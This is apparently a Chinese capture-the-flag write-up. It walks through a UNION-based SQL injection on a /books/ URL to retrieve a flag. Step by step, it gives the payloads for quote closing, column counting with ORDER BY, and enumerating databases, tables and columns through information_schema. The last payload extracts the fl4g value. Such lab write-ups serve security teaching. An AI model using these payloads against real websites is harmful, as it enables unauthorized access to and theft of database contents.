1.先判断注入点类型，测试发现可以用单引号闭合并且用#注释后面的单引号（%23是#的url编码）

```
/books/0';%23
```

2.测试返回字段的数量，当order by 3时不报错，order by 4时报错说明返回字段数量为3.

```
/books/0'order by 3;%23
```
![图 2](https://s2.loli.net/2022/09/01/LGlkpOXwTP1NF2d.png)  

3.爆数据库名，发现book

```
/books/0'union select 1,schema_name,3 from information_schema.schemata;%23
```
![图 1](https://s2.loli.net/2022/09/01/vChFnD9Z2lzYqNS.png)  

4.爆数据表名，在book数据库中发现secret
```
/books/0'union select 1,table_name,3 from information_schema.tables where table_schema='book'%23
```
![图 3](https://s2.loli.net/2022/09/01/8E5lDHQLaFv43cb.png)  

5.爆列名，在book数据库的secret表中发现列名fl4g
```
/books/0'union select 1,column_name,3 from information_schema.columns where table_name='secret'%23
```
![图 4](https://s2.loli.net/2022/09/01/RuQqWeiyK37vOfA.png)  

6.取值，从book数据库的secret表中取出列fl4g的值
```
/books/0'union select 1,fl4g,3 from secret;%23
```
![图 5](https://s2.loli.net/2022/09/01/VZaAqF1HmSfg8lP.png)  
